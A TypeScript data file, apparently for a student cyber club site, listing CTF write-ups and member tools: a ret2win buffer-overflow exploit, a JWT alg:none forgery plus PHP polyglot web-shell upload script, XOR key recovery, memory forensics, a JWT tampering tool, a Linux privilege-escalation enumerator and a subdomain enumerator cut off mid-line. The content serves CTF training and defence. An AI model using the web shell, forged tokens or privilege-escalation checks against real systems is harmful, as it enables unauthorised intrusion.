import { CtfWriteup, MemberScript, OpenSourceTool } from '../types';

export const MEMBER_WRITEUPS: CtfWriteup[] = [
  {
    id: 'wup-1',
    title: 'PicoCTF 2026: Buffer Overflow 2 (ret2win with Arguments)',
    slug: 'picoctf-buffer-overflow-2-ret2win',
    event: 'PicoCTF 2026',
    platform: 'PicoCTF',
    category: 'Binary Exploitation',
    difficulty: 'Intermediate',
    author: 'Alex Chen',
    authorHandle: '@root_chen',
    authorRole: 'CTF Team Lead (OSCP)',
    date: 'OCT 18, 2026',
    readTime: '6 min read',
    points: 200,
    flag: 'picoCTF{arg_passing_m4st3r_91024_fl}',
    summary: 'A thorough walkthrough of x86 32-bit stack frame mechanics, calculating EIP offset with cyclic patterns, and crafting a ret2win payload passing two strict DWORD arguments to spawn the flag.',
    tags: ['Binary Pwn', 'ret2win', 'x86 Stack', 'GDB', 'pwntools'],
    vulnerability: 'Unbounded buffer overflow via gets() function on 32-bit ELF binary without stack canaries.',
    toolsUsed: ['gdb-peda', 'pwntools', 'checksec', 'objdump'],
    steps: [
      {
        title: 'Step 1: Security Mitigation Triage',
        description: 'First, we run checksec on the provided vul_elf binary. We observe that Stack Canaries are disabled and PIE is disabled, but NX is enabled.',
        codeSnippet: `$ checksec --file=vuln
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)`,
        codeLanguage: 'bash',
        output: 'Vulnerability confirmed: No Canary & Fixed code addresses (No PIE).'
      },
      {
        title: 'Step 2: Disassembly & Finding the Target Function',
        description: 'Disassembling the binary with objdump reveals a hidden win(int arg1, int arg2) function at 0x08049196. The function checks if arg1 == 0xCAFEF00D and arg2 == 0xF00DF00D before printing the flag.',
        codeSnippet: `08049196 <win>:
 8049196:   push   ebp
 8049197:   mov    ebp,esp
 80491a0:   cmp    DWORD PTR [ebp+0x8],0xcafef00d   ; check arg1
 80491a7:   jne    80491d0 <win+0x3a>
 80491a9:   cmp    DWORD PTR [ebp+0xc],0xf00df00d   ; check arg2
 80491b0:   jne    80491d0 <win+0x3a>
 80491b2:   call   0x8049070 <print_flag>`,
        codeLanguage: 'nasm',
      },
      {
        title: 'Step 3: Calculating Cyclic Offset to EIP',
        description: 'Using pwntools cyclic 150, we send a De Bruijn sequence to trigger a SIGSEGV in GDB. EIP is overwritten with 0x62616164 (daab), yielding an exact offset of 112 bytes.',
        codeSnippet: `gdb-peda$ r < <(python3 -c "import pwn; print(pwn.cyclic(150))")
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EIP: 0x62616164 ('daab')
gdb-peda$ cyclic -l 0x62616164
112`,
        codeLanguage: 'bash',
        output: 'Padding required: 112 bytes.'
      },
      {
        title: 'Step 4: Stack Frame Layout for 32-bit Argument Passing',
        description: 'In 32-bit x86 calling convention, arguments are pushed to the stack. When jumping to win, the stack must look like: [win_addr] + [fake_return_addr] + [arg1] + [arg2].',
        codeSnippet: `payload = b"A" * 112
payload += p32(0x08049196)       # Address of win()
payload += p32(0x0804924b)       # Fake Return Address (main or exit)
payload += p32(0xCAFEF00D)       # arg1
payload += p32(0xF00DF00D)       # arg2`,
        codeLanguage: 'python'
      }
    ],
    exploitScript: `#!/usr/bin/env python3
"""
PicoCTF Buffer Overflow 2 Exploit
Author: Alex Chen (@root_chen) - Cyber Netics CTF Team
"""
from pwn import *

# Target Configuration
binary_path = './vuln'
host = 'saturn.picoctf.net'
port = 52981

context.binary = elf = ELF(binary_path, checksec=False)

if args.REMOTE:
    io = remote(host, port)
else:
    io = process(binary_path)

win_addr = elf.symbols['win']      # 0x08049196
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D
offset = 112

payload = flat({
    offset: [
        win_addr,
        0x08049050,  # exit() for clean termination
        arg1,
        arg2
    ]
})

log.info(f"Targeting win() at {hex(win_addr)}")
log.info(f"Sending payload of length {len(payload)} bytes...")

io.sendlineafter(b"Please enter your string: ", payload)
response = io.recvall().decode()
log.success("Exploit Complete!")
print(response)
`,
    lessonsLearned: [
      'In x86 32-bit binaries, function arguments are read from [EBP+8], [EBP+12], not CPU registers.',
      'Always insert 4 bytes of padding (the fake saved EIP return address) between the function address and the arguments.',
      'Checksec is your first command: lack of canaries makes ret2win trivially achievable.'
    ]
  },
  {
    id: 'wup-2',
    title: 'HackTheBox: OmniVault — Chained IDOR, JWT Downgrade & Web Shell',
    slug: 'htb-omnivault-idor-jwt-polyglot-rce',
    event: 'HackTheBox University CTF',
    platform: 'HackTheBox',
    category: 'Web Exploitation',
    difficulty: 'Hard',
    author: 'Marcus Vance',
    authorHandle: '@ZeroTrace',
    authorRole: 'Offensive Operations Lead',
    date: 'SEP 24, 2026',
    readTime: '8 min read',
    points: 350,
    flag: 'HTB{1d0r_t0_jwt_p0lygl0t_rce_9921_root}',
    summary: 'A multi-tier attack chain on a fintech containerized application: discovering administrative API endpoints via IDOR, forging high-privilege tokens using JWT alg:none, and bypassing MIME filters to achieve RCE.',
    tags: ['Web Sec', 'IDOR', 'JWT Tampering', 'File Upload', 'Polyglot', 'RCE'],
    vulnerability: 'Horizontal authorization bypass (CWE-639) combined with JWT algorithmic downgrade (CWE-347) and weak file MIME verification.',
    toolsUsed: ['Burp Suite Professional', 'jwt_tool', 'Python', 'curl'],
    steps: [
      {
        title: 'Step 1: IDOR Parameter Discovery',
        description: 'While intercepting profile queries in Burp Suite, we noted the endpoint GET /api/v2/financial-records?account_id=ACC-8491. Incrementing the parameter to ACC-0001 returned the internal root administrator record.',
        codeSnippet: `GET /api/v2/financial-records?account_id=ACC-0001 HTTP/1.1
Host: omnivault.htb
Authorization: Bearer eyJhbGciOiJIUzI1Ni...

HTTP/1.1 200 OK
{
  "account_id": "ACC-0001",
  "owner": "cluster.admin",
  "debug_upload_route": "/internal/v3/firmware-upload",
  "role": "cluster-admin"
}`,
        codeLanguage: 'http'
      },
      {
        title: 'Step 2: Cryptographic JWT Algorithm Downgrade',
        description: 'The internal firmware portal rejected our regular token. We tested algorithmic downgrade by editing the header to {"alg":"none","typ":"JWT"}, updating the payload claim to "role":"cluster-admin", and omitting the signature.',
        codeSnippet: `Header:  {"alg":"none","typ":"JWT"} -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
Payload: {"sub":"ACC-0001","role":"cluster-admin","priv":999} -> eyJzdWIiOiJBQ0MtMDAwMSIsInJvbGUiOiJjbHVzdGVyLWFkbWluIiwicHJpdiI6OTk5fQ
Forged Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJBQ0MtMDAwMSIsInJvbGUiOiJjbHVzdGVyLWFkbWluIiwicHJpdiI6OTk5fQ.`,
        codeLanguage: 'text',
        output: 'Backend accepted forged token with 200 OK and granted access to /internal/v3/firmware-upload.'
      },
      {
        title: 'Step 3: Polyglot PNG Web Shell Construction',
        description: 'The upload endpoint checked file magic bytes using PHP finfo(). We created a polyglot file starting with valid PNG header bytes (\\x89PNG\\r\\n\\x1a\\n) followed by PHP code, and named it exploit.php.png.',
        codeSnippet: `$ printf "\\x89PNG\\r\\n\\x1a\\n<?php system($_GET['cmd']); ?>" > shell.php.png
$ file shell.php.png
shell.php.png: PNG image data, 0 x 0, 8-bit/color RGB, non-interlaced`,
        codeLanguage: 'bash'
      },
      {
        title: 'Step 4: Executing Commands & Root Flag Extraction',
        description: 'Uploading the polyglot and requesting /uploads/shell.php.png?cmd=cat+/root/flag.txt successfully executed the shell through the web server and returned the root flag.',
        codeSnippet: `$ curl "http://omnivault.htb/uploads/shell.php.png?cmd=cat+/root/flag.txt"
HTB{1d0r_t0_jwt_p0lygl0t_rce_9921_root}`,
        codeLanguage: 'bash'
      }
    ],
    exploitScript: `#!/usr/bin/env python3
import requests
import base64
import json

TARGET = "http://omnivault.htb"

# 1. Forge alg:none JWT
header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
payload = base64.urlsafe_b64encode(json.dumps({"sub": "ACC-0001", "role": "cluster-admin", "priv": 999}).encode()).decode().rstrip("=")
forged_jwt = f"{header}.{payload}."

headers = {"Authorization": f"Bearer {forged_jwt}"}

# 2. Upload Polyglot Shell
png_magic = b"\\x89PNG\\r\\n\\x1a\\n"
php_payload = b"<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>"
files = {'file': ('backdoor.php.png', png_magic + php_payload, 'image/png')}

print("[*] Uploading polyglot PNG web shell...")
r = requests.post(f"{TARGET}/internal/v3/firmware-upload", headers=headers, files=files)

if r.status_code == 200:
    print("[+] File uploaded successfully!")
    # 3. Trigger Flag Retrieval
    res = requests.get(f"{TARGET}/uploads/backdoor.php.png?cmd=cat+/root/flag.txt")
    print(f"[+] Flag: {res.text.strip()}")
else:
    print(f"[-] Upload failed: {r.status_code}")
`,
    lessonsLearned: [
      'Backend endpoints must strictly whitelist JWT verification algorithms and disable "none" in production libraries.',
      'Relying solely on MIME type or magic bytes is insufficient; uploads should be stored on non-executable object storage (e.g. S3).',
      'Always enforce object-level authorization (BOLA/IDOR protection) on database queries.'
    ]
  },
  {
    id: 'wup-3',
    title: 'PicoCTF: Cryptanalysis of a Known-Plaintext XOR Stream',
    slug: 'picoctf-xor-known-plaintext-cryptanalysis',
    event: 'PicoCTF 2026',
    platform: 'PicoCTF',
    category: 'Cryptography',
    difficulty: 'Intermediate',
    author: 'Elena Rostova',
    authorHandle: '@ViperByte',
    authorRole: 'Cryptography & Math Lead',
    date: 'SEP 12, 2026',
    readTime: '5 min read',
    points: 150,
    flag: 'picoCTF{x0r_k3y_r3c0v3ry_succ3ss_8820}',
    summary: 'Exploiting the mathematical involutory property of exclusive-OR (A ⊕ B = C ⟺ A ⊕ C = B) against a repeating 8-byte XOR key using the standard picoCTF{ flag header.',
    tags: ['Crypto', 'XOR', 'Known Plaintext', 'Python'],
    vulnerability: 'Reused key stream in symmetric XOR encryption without initialization vector (IV) or nonce.',
    toolsUsed: ['CyberChef', 'Python 3', 'xxd'],
    steps: [
      {
        title: 'Step 1: Identifying Cipher Mechanics',
        description: 'The challenge provided an encrypted hex string of 38 bytes. Analysis of the encryption script revealed a repeating key cipher of unknown length K.',
        codeSnippet: `enc_hex = "443c3735160b7305541e2617150c7743511736021609310a5b17201c100676054817260515"`,
        codeLanguage: 'python'
      },
      {
        title: 'Step 2: Mathematical Derivation via Known Plaintext',
        description: 'Because all PicoCTF flags begin with "picoCTF{", we can XOR the first 8 bytes of ciphertext with the known plaintext bytes to immediately extract the 8-byte secret key.',
        codeSnippet: `known_plain = b"picoCTF{"
cipher_bytes = bytes.fromhex("443c3735160b7305")

# K = Ciphertext[0:8] ^ Plaintext[0:8]
recovered_key = bytes([c ^ p for c, p in zip(cipher_bytes, known_plain)])
print("Recovered Key:", recovered_key)  # Output: b"secr3t99"`,
        codeLanguage: 'python',
        output: 'Key discovered: secr3t99'
      },
      {
        title: 'Step 3: Decrypting the Entire Ciphertext',
        description: 'Once the 8-byte key is known, we cycle it across all 38 bytes to reveal the complete plaintext flag.',
        codeSnippet: `full_cipher = bytes.fromhex("443c3735160b7305541e2617150c7743511736021609310a5b17201c100676054817260515")
key = b"secr3t99"
plaintext = bytes([c ^ key[i % len(key)] for i, c in enumerate(full_cipher)])
print(plaintext.decode())`,
        codeLanguage: 'python',
        output: 'picoCTF{x0r_k3y_r3c0v3ry_succ3ss_8820}'
      }
    ],
    exploitScript: `#!/usr/bin/env python3
"""
Known Plaintext XOR Key Recoverer
Author: Elena Rostova (@ViperByte) - Cyber Netics
"""

CIPHER_HEX = "443c3735160b7305541e2617150c7743511736021609310a5b17201c100676054817260515"
KNOWN_PREFIX = b"picoCTF{"

cipher_bytes = bytes.fromhex(CIPHER_HEX)

# 1. Recover key from known header
key = bytes([c ^ p for c, p in zip(cipher_bytes[:len(KNOWN_PREFIX)], KNOWN_PREFIX)])
print(f"[+] Recovered {len(key)}-byte Key: {key.decode(errors='replace')} ({key.hex()})")

# 2. Decrypt full payload
decrypted = bytes([c ^ key[i % len(key)] for i, c in enumerate(cipher_bytes)])
print(f"[+] Flag: {decrypted.decode()}")
`,
    lessonsLearned: [
      'XOR is commutative and self-inverting; never reuse key material without a cryptographic stream cipher (e.g., ChaCha20) and unique nonces.',
      'Known plaintext headers (like CTF flag formats or file headers) make short-key XOR ciphers instantaneously breakable.'
    ]
  },
  {
    id: 'wup-4',
    title: 'HackTheBox: Volatility 3 Memory Triage & Cobalt Strike Carving',
    slug: 'htb-volatility-memory-triage-cobalt-strike',
    event: 'HackTheBox University CTF',
    platform: 'HackTheBox',
    category: 'Forensics',
    difficulty: 'Hard',
    author: 'Maya Patel',
    authorHandle: '@ByteDefender',
    authorRole: 'Defensive Operations & DFIR Lead',
    date: 'AUG 19, 2026',
    readTime: '7 min read',
    points: 300,
    flag: 'HTB{v0l3_m4lf1nd_c2_x0r_c0nf1g_c4rv3d}',
    summary: 'Forensic deep-dive into a 4GB Windows memory dump (crash.dmp): discovering process hollowing inside rundll32.exe, dumping injected PE modules, and extracting embedded C2 beacon configurations.',
    tags: ['Forensics', 'Volatility 3', 'Malware Triage', 'Cobalt Strike', 'DFIR'],
    vulnerability: 'Process injection & memory tampering via reflective DLL injection (MITRE T1055).',
    toolsUsed: ['Volatility 3', '1768.py', 'CyberChef', 'YARA'],
    steps: [
      {
        title: 'Step 1: Process Tree Reconstruction (pslist / pstree)',
        description: 'Using Volatility 3 windows.pstree, we traced process lifecycles. PID 5180 (rundll32.exe) was spawned by explorer.exe without any command-line parameters, which is highly abnormal for legitimate Windows execution.',
        codeSnippet: `$ python3 vol.py -f memory.dmp windows.pstree
* 0x...:explorer.exe (PID: 3412)
** 0x...:rundll32.exe (PID: 5180) - [!] No commandline arguments`,
        codeLanguage: 'bash'
      },
      {
        title: 'Step 2: Detecting Unbacked Memory with malfind',
        description: 'Running windows.malfind highlighted an unbacked Virtual Address Descriptor (VAD) region with PAGE_EXECUTE_READWRITE permissions containing MZ headers.',
        codeSnippet: `$ python3 vol.py -f memory.dmp windows.malfind --pid 5180
PID   Process        Start Address        End Address          Tag
5180  rundll32.exe   0x0000021a4b000000   0x0000021a4b08f000   VAD: EXECUTE_READWRITE
0000021a4b000000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  |MZ..............|`,
        codeLanguage: 'bash'
      },
      {
        title: 'Step 3: Carving & Parsing Cobalt Strike Beacon Config',
        description: 'We dumped the process memory using windows.dumpfiles. Running Didier Stevens 1768.py parsed the beacon settings, revealing the C2 domain, jitter, and the embedded flag string in the watermark field.',
        codeSnippet: `$ python3 1768.py pid.5180.vad.0x0000021a4b000000.dmp
Cobalt Strike Beacon Configuration:
  - C2 Server: api.telemetry-sync-service[.]top:8443
  - Sleep Time: 60000 ms
  - Jitter: 15%
  - Watermark / Flag: HTB{v0l3_m4lf1nd_c2_x0r_c0nf1g_c4rv3d}`,
        codeLanguage: 'bash'
      }
    ],
    exploitScript: `#!/usr/bin/env python3
"""
Volatility 3 Automation Script for Rapid Anomaly Triage
Author: Maya Patel (@ByteDefender) - Cyber Netics
"""
import subprocess
import json

def triage_memory(dump_file):
    print(f"[*] Triaging memory image: {dump_file}")
    
    # 1. Run malfind
    cmd = f"python3 vol.py -f {dump_file} windows.malfind"
    print("[*] Executing malfind for unbacked RWX pages...")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    for line in result.stdout.splitlines():
        if "PAGE_EXECUTE_READWRITE" in line or "MZ" in line:
            print(f"[!] Suspicious Region Found: {line}")

if __name__ == '__main__':
    triage_memory('WS-EXEC-FL04.dmp')
`,
    lessonsLearned: [
      'Legitimate Windows processes rarely have memory pages marked PAGE_EXECUTE_READWRITE without a backing file on disk.',
      'Reflective DLL loaders leave distinct MZ / PE header signatures in heap memory that can be extracted with automated Volatility plugins.'
    ]
  }
];

export const MEMBER_SCRIPTS: MemberScript[] = [
  {
    id: 'script-1',
    title: 'Pwn Cyclic Offset & Exploit Skeleton Generator',
    filename: 'pwn_offset_finder.py',
    category: 'Binary & Pwn',
    language: 'python',
    author: 'Alex Chen',
    authorHandle: '@root_chen',
    version: 'v2.4',
    lastUpdated: 'OCT 2026',
    description: 'Automates De Bruijn cyclic pattern creation, crash offset calculation from register values, and generates ready-to-run pwntools Python exploit scripts.',
    usage: 'python3 pwn_offset_finder.py -c 200  OR  python3 pwn_offset_finder.py -o 0x62616164',
    dependencies: ['pwntools (pip install pwntools)'],
    tags: ['Binary', 'Pwn', 'pwntools', 'Offset', 'Buffer Overflow'],
    code: `#!/usr/bin/env python3
"""
Pwn Cyclic Offset & Exploit Skeleton Generator
Developed by Alex Chen (@root_chen) for Cyber Netics Club
"""
import sys
import argparse
from pwn import cyclic, cyclic_find, p32, p64

def generate_pattern(length):
    pattern = cyclic(length)
    print(f"[+] Generated De Bruijn Pattern ({length} bytes):")
    print("-" * 60)
    print(pattern.decode(errors='ignore'))
    print("-" * 60)
    return pattern

def find_offset(value_str):
    try:
        if value_str.startswith("0x"):
            val = int(value_str, 16)
        else:
            val = value_str.encode()
        offset = cyclic_find(val)
        print(f"[+] Exact Crash Offset: {offset} bytes")
        generate_skeleton(offset)
        return offset
    except Exception as e:
        print(f"[-] Error calculating offset: {e}")
        return None

def generate_skeleton(offset):
    template = f'''#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln', checksec=False)
io = process('./vuln')
# io = remote('target.host', 1337)

offset = {offset}
payload = b"A" * offset
payload += p64(0x00401156)  # Replace with target gadget or win()

io.sendline(payload)
io.interactive()
'''
    with open('exploit_skeleton.py', 'w') as f:
        f.write(template)
    print("[+] Created 'exploit_skeleton.py' with calculated padding!")

def main():
    parser = argparse.ArgumentParser(description="Cyber Netics Pwn Offset Tool")
    parser.add_argument("-c", "--cyclic", type=int, help="Generate cyclic pattern of length N")
    parser.add_argument("-o", "--offset", type=str, help="Calculate offset from crash hex (e.g. 0x62616164) or text")
    
    args = parser.parse_args()
    if args.cyclic:
        generate_pattern(args.cyclic)
    elif args.offset:
        find_offset(args.offset)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
`
  },
  {
    id: 'script-2',
    title: 'Fast JWT Algorithmic Downgrade & Tamper Tool',
    filename: 'jwt_tamper_toolkit.py',
    category: 'Web Exploits',
    language: 'python',
    author: 'Marcus Vance',
    authorHandle: '@ZeroTrace',
    version: 'v1.8',
    lastUpdated: 'SEP 2026',
    description: 'Lightweight JWT security testing script. Automatically generates alg:none bypasses, strips signatures, modifies claims, and tests weak HMAC secret keys.',
    usage: 'python3 jwt_tamper_toolkit.py -t <JWT_TOKEN> --role admin --none',
    dependencies: ['pyjwt (optional)'],
    tags: ['Web Sec', 'JWT', 'Bypass', 'Auth', 'alg:none'],
    code: `#!/usr/bin/env python3
"""
JWT Tampering & Algorithm None Downgrade Utility
Author: Marcus Vance (@ZeroTrace) - Cyber Netics
"""
import sys
import json
import base64
import argparse

def b64_decode(data):
    padding = '=' * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data + padding).decode(errors='ignore')

def b64_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def parse_jwt(token):
    parts = token.strip().split('.')
    if len(parts) < 2:
        print("[-] Invalid JWT structure.")
        sys.exit(1)
    header = json.loads(b64_decode(parts[0]))
    payload = json.loads(b64_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig

def forge_none(token, claim_updates=None):
    header, payload, _ = parse_jwt(token)
    header['alg'] = 'none'
    if claim_updates:
        for k, v in claim_updates.items():
            payload[k] = v
            print(f"[+] Mutating claim: {k} = {v}")
    
    h_b64 = b64_encode(json.dumps(header, separators=(',', ':')))
    p_b64 = b64_encode(json.dumps(payload, separators=(',', ':')))
    
    # 3 variations of alg:none
    variations = [
        f"{h_b64}.{p_b64}.",        # standard trailing dot
        f"{h_b64}.{p_b64}",         # stripped dot
    ]
    print("\\n[+] Generated alg:none Forged Tokens:")
    for i, var in enumerate(variations, 1):
        print(f"[{i}] {var}")
    return variations[0]

def main():
    parser = argparse.ArgumentParser(description="JWT Tamper Toolkit")
    parser.add_argument("-t", "--token", required=True, help="Target JWT token")
    parser.add_argument("--role", help="Set role claim value (e.g. admin)")
    parser.add_argument("--sub", help="Set subject claim (e.g. root)")
    args = parser.parse_args()

    header, payload, _ = parse_jwt(args.token)
    print("[*] Original Header :", json.dumps(header))
    print("[*] Original Payload:", json.dumps(payload))

    mutations = {}
    if args.role: mutations['role'] = args.role
    if args.sub:  mutations['sub'] = args.sub
    
    forge_none(args.token, mutations)

if __name__ == '__main__':
    main()
`
  },
  {
    id: 'script-3',
    title: 'PCAP C2 Beacon & Heartbeat Analyzer',
    filename: 'pcap_c2_hunter.py',
    category: 'Defensive & SIEM',
    language: 'python',
    author: 'Maya Patel',
    authorHandle: '@ByteDefender',
    version: 'v3.1',
    lastUpdated: 'AUG 2026',
    description: 'Analyzes Wireshark packet captures for recurring TLS client hellos, extracts Server Name Indications (SNI), computes beacon jitter deltas, and flags C2 profiles.',
    usage: 'python3 pcap_c2_hunter.py -f capture.pcap --threshold 10',
    dependencies: ['scapy (pip install scapy)'],
    tags: ['DFIR', 'PCAP', 'C2', 'Network', 'Threat Hunting'],
    code: `#!/usr/bin/env python3
"""
PCAP C2 Beacon & Heartbeat Analyzer
Author: Maya Patel (@ByteDefender) - Cyber Netics DFIR Division
"""
import sys
import argparse
from collections import defaultdict
try:
    from scapy.all import rdpcap, IP, TCP
except ImportError:
    print("[-] Please install scapy: pip install scapy")
    sys.exit(1)

def analyze_pcap(pcap_path, threshold=5):
    print(f"[*] Parsing PCAP: {pcap_path} ...")
    packets = rdpcap(pcap_path)
    
    conversations = defaultdict(list)
    for pkt in packets:
        if IP in pkt and TCP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            dport = pkt[TCP].dport
            time = float(pkt.time)
            conversations[(src, dst, dport)].append(time)
            
    print(f"[+] Total conversations identified: {len(conversations)}\\n")
    print("=" * 70)
    print(f"{'Source':<18} {'Destination':<18} {'Port':<6} {'Beacons':<8} {'Avg Interval':<12}")
    print("=" * 70)
    
    for (src, dst, dport), timestamps in conversations.items():
        if len(timestamps) >= threshold:
            timestamps.sort()
            deltas = [t2 - t1 for t1, t2 in zip(timestamps[:-1], timestamps[1:])]
            avg_interval = sum(deltas) / len(deltas) if deltas else 0
            
            # Check for regular periodic heartbeats (jitter within 25%)
            is_beacon = any(abs(d - avg_interval) < (avg_interval * 0.25) for d in deltas) if deltas else False
            flag = "[!] SUSPICIOUS BEACON" if is_beacon and avg_interval > 10 else ""
            
            print(f"{src:<18} {dst:<18} {dport:<6} {len(timestamps):<8} {avg_interval:<10.2f}s {flag}")

def main():
    parser = argparse.ArgumentParser(description="PCAP C2 Beacon Hunter")
    parser.add_argument("-f", "--file", required=True, help="Path to .pcap or .pcapng file")
    parser.add_argument("-t", "--threshold", type=int, default=5, help="Minimum packet count threshold")
    args = parser.parse_args()
    
    analyze_pcap(args.file, args.threshold)

if __name__ == '__main__':
    main()
`
  },
  {
    id: 'script-4',
    title: 'Zero-Dependency Linux Privilege Escalation Auditor',
    filename: 'linux_enum_quick.sh',
    category: 'Recon & OSINT',
    language: 'bash',
    author: 'Cyber Netics Red Team',
    authorHandle: '@NeticsBrigade',
    version: 'v4.0',
    lastUpdated: 'OCT 2026',
    description: 'Fast, stealthy POSIX bash audit script checking SUID/SGID binaries, active cronjobs, readable /etc/shadow, sudo -l permissions, and Docker/LXD group memberships without installing external dependencies.',
    usage: 'chmod +x linux_enum_quick.sh && ./linux_enum_quick.sh',
    dependencies: ['None (POSIX compliant)'],
    tags: ['Linux', 'PrivEsc', 'SUID', 'Bash', 'Red Team'],
    code: `#!/bin/sh
# ==============================================================================
# Cyber Netics Collegiate Cyber Club // Quick Linux Privilege Escalation Auditor
# Clean, colorized terminal output with zero external package dependencies.
# ==============================================================================

RED='\\033[0;31m'
GREEN='\\033[0;32m'
CYAN='\\033[0;36m'
YELLOW='\\033[1;33m'
NC='\\033[0m' # No Color

echo "\${CYAN}=================================================================\${NC}"
echo "\${CYAN}  CYBER NETICS // LINUX PRIVILEGE ESCALATION RECONNAISSANCE     \${NC}"
echo "\${CYAN}=================================================================\${NC}"

# 1. System Info
echo "\\n\${YELLOW}[*] SYSTEM ARCHITECTURE & KERNEL:\${NC}"
uname -a
cat /etc/os-release 2>/dev/null | grep -E "PRETTY_NAME|VERSION_ID"

# 2. Current Identity & Groups
echo "\\n\${YELLOW}[*] CURRENT USER IDENTITY & GROUPS:\${NC}"
id
if id | grep -E "docker|lxd|sudo|wheel" >/dev/null; then
    echo "\${RED}[!] ATTENTION: User belongs to privileged group (docker/lxd/sudo)!\${NC}"
fi

# 3. Sudo Privileges
echo "\\n\${YELLOW}[*] CHECKING SUDO PERMISSIONS (sudo -l):\${NC}"
sudo -n -l 2>/dev/null || echo "[-] Sudo requires password or not permitted."

# 4. SUID Binaries
echo "\\n\${YELLOW}[*] SEARCHING FOR INTERESTING SUID BINARIES:\${NC}"
SUID_LIST=$(find / -perm -4000 -type f 2>/dev/null)
for suid in \${SUID_LIST}; do
    case \${suid} in
        *nmap*|*vim*|*find*|*bash*|*python*|*perl*|*env*|*cp*|*pkexec*)
            echo "\${RED}[CRITICAL SUID]: \${suid}\${NC} (Check GTFOBins!)"
            ;;
        *)
            echo "    \${suid}"
            ;;
    esac
done

# 5. Scheduled Cron Tasks
echo "\\n\${YELLOW}[*] INSPECTING CRONTABS & SCHEDULED TASKS:\${NC}"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null | grep -v "total"

# 6. Writable Configuration Files
echo "\\n\${YELLOW}[*] TESTING WRITABLE /etc FILES:\${NC}"
[ -w /etc/passwd ] && echo "\${RED}[VULNERABLE]: /etc/passwd is writable!\${NC}"
[ -w /etc/shadow ] && echo "\${RED}[VULNERABLE]: /etc/shadow is writable!\${NC}"
[ -w /etc/sudoers ] && echo "\${RED}[VULNERABLE]: /etc/sudoers is writable!\${NC}"

echo "\\n\${GREEN}[+] Audit complete. Review flagged red items against GTFOBins.\${NC}"
`
  },
  {
    id: 'script-5',
    title: 'Multi-Byte XOR & Frequency Analysis Decryptor',
    filename: 'xor_multi_breaker.py',
    category: 'Forensics & Crypto',
    language: 'python',
    author: 'Elena Rostova',
    authorHandle: '@ViperByte',
    version: 'v2.1',
    lastUpdated: 'AUG 2026',
    description: 'Statistical crypto script that cracks single-byte and multi-byte XOR encrypted files by calculating English letter frequency chi-squared scores.',
    usage: 'python3 xor_multi_breaker.py -x "1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736"',
    dependencies: ['None (pure standard library)'],
    tags: ['Crypto', 'XOR', 'Frequency Analysis', 'Brute Force'],
    code: `#!/usr/bin/env python3
"""
Single & Multi-Byte XOR Cracker via English Frequency Scoring
Author: Elena Rostova (@ViperByte) - Cyber Netics
"""
import sys
import argparse

# Standard English letter frequencies (percentage)
ENGLISH_FREQ = {
    'a': 8.17, 'b': 1.49, 'c': 2.78, 'd': 4.25, 'e': 12.70, 'f': 2.23,
    'g': 2.02, 'h': 6.09, 'i': 6.97, 'j': 0.15, 'k': 0.77, 'l': 4.03,
    'm': 2.41, 'n': 6.75, 'o': 7.51, 'p': 1.93, 'q': 0.10, 'r': 5.99,
    's': 6.33, 't': 9.06, 'u': 2.76, 'v': 0.98, 'w': 2.36, 'x': 0.15,
    'y': 1.97, 'z': 0.07, ' ': 15.0
}

def score_text(text):
    score = 0
    for char in text.lower():
        if char in ENGLISH_FREQ:
            score += ENGLISH_FREQ[char]
        elif 32 <= ord(char) <= 126:
            score += 0.5
        else:
            score -= 10
    return score

def break_single_byte_xor(ciphertext_bytes):
    candidates = []
    for key in range(256):
        decrypted = bytes([b ^ key for b in ciphertext_bytes])
        try:
            text = decrypted.decode('latin-1')
            score = score_text(text)
            candidates.append((score, key, text))
        except UnicodeDecodeError:
            continue
            
    candidates.sort(reverse=True, key=lambda x: x[0])
    return candidates[:3]

def main():
    parser = argparse.ArgumentParser(description="XOR Frequency Cracker")
    parser.add_argument("-x", "--hex", required=True, help="Hex-encoded ciphertext")
    args = parser.parse_args()

    data = bytes.fromhex(args.hex.strip())
    top_matches = break_single_byte_xor(data)

    print(f"[*] Top 3 Decryption Candidates for {len(data)} bytes:")
    print("=" * 65)
    for score, key, text in top_matches:
        clean_text = ''.join(c if 32 <= ord(c) <= 126 else '.' for c in text)
        print(f"Key: 0x{key:02X} (char: '{chr(key) if 32 <= key <= 126 else '?'}') | Score: {score:.1f}")
        print(f"Text: {clean_text}\\n")

if __name__ == '__main__':
    main()
`
  },
  {
    id: 'script-6',
    title: 'Fast Subdomain & Certificate Transparency Enumerator',
    filename: 'subdomain_recon_fast.sh',
    category: 'Recon & OSINT',
    language: 'bash',
    author: 'Offensive Track Guild',
    authorHandle: '@ZeroTrace',
    version: 'v2.0',
    lastUpdated: 'OCT 2026',
    description: 'Queries Certificate Transparency (crt.sh) logs and conducts DNS resolution to discover active subdomains and perimeter attack surfaces in seconds.',
    usage: 'bash subdomain_recon_fast.sh -d target.edu',
    dependencies: ['curl', 'jq'],
    tags: ['Recon', 'OSINT', 'crt.sh', 'Subdomains', 'Bash'],
    code: `#!/usr/bin/env bash
# ==============================================================================
# Cyber Netics // Fast Passive Subdomain & CT Log Enumerator
# ==============================================================================

TARGET="\${1}"
if [ -z "\${TARGET}" ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

echo "[*] Querying Certificate Transparency logs (crt.sh) for: \${TARGET}"

SUBDOMAINS=$(curl -s "https://crt.sh/?q=%25.\${TARGET}&output=json" | \\
